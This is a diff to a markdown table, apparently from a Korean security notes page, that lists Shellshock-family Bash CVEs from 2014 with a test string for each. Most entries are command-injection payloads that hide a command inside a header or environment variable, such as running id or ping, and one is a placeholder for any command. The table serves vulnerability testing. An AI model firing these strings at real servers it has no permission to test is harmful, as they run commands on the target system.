@@ -13,12 +13,12 @@
 
 | CVE NAME | Test Code |
 | :--- | :--- |
-| CVE-2014-6271 | User-Agent: \(\) { :;}; /bin/bash -c "ping ${IP\_ADDRESS} –c3" |
+| CVE-2014-6271 | export x="\(\) { :; }; \[임의의 명령\];" |
 | CVE-2014-6277 | User-Agent: \(\) { 0; }; /bin/bash -c 'x\(\) { \_; }; x\(\) { \_; } &lt;&lt;a;' |
 | CVE-2014-6278 | User-Agent: \(\) { \_; } &gt;\_\[$\($\(\)\)\] { id &gt;/tmp/CVE-2014-6278; } |
 | CVE-2014-7169 | env X='\(\) { \(a\)=&gt;\' bash -c "echo date" |
 | CVE-2014-7186 | bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' |
 | CVE-2014-7187 | \(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done\) \| bash \|\| echo "CVE-2014-7187 vulnerable, word\_lineno" |
 
-
+출처 : [http://teamcrak.tistory.com/380](http://teamcrak.tistory.com/380)
 
